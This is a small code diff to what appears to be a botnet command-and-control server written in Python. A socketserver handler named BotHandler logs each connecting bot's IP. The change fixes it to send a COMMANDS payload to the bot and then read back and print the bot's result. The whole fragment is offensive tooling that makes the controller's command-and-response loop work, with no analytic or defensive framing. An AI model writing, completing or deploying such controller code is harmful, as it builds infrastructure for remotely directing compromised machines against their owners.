@@ -9,7 +9,10 @@ class BotHandler(socketserver.BaseRequestHandler):
   def handle(self):
     self.data = self.request.recv(1024).strip()
     print("[*] Bot with IP:" + '' + self.client_address[0])
-    self.request(COMMANDS)
+    self.request.sendall(COMMANDS)
+
+    result = (self.request.recv(4096)).decode()
+    print(f"IP: {self.client_address[0]}\nRESULT: {result}")
 
   
 if __name__ == "__main__":
